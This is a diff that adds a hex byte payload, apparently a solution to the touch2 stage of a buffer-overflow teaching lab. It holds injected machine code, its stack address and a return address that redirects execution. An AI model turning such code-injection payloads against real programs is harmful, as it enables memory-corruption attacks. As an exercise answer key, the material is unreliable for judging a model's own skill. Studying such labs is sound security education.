@@ -1,0 +1,6 @@
+00 00 00 00 00 00 00 00 // alignment
+48 c7 c7 45 ff 1e 3c 48 // injected code
+c7 c4 00 9a 66 55 c3 00 // injected code
+e0 99 66 55 00 00 00 00 // address of injected code
+00 00 00 00 00 00 00 00 // alignment
+2e 15 40 00 00 00 00 00 // touch2's address
